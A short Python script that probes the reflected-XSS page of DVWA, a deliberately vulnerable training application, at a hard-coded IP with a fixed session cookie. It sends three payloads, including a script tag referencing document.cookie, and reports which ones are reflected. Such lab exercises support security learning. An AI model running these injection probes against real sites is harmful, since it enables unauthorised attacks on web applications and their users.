import requests

headers = {'Cookie' : 'security=low; PHPSESSID=2iobm0910u0jdkmfgvbk98pbl3'}

target = "http://180.232.87.123/DVWA/vulnerabilities/xss_r/?name="

payloads = ["<h1>TEST</H1>", "<marquee>HACKEADO</marquee>", 
"<script>(document.cookie)</script>"]

for payload in payloads:
  response = requests.get(target + payload, headers=headers)
  print(target + payload)
  if payload in response.text:
    print("Injection Working --> [OK] - Payload: %s" % payload)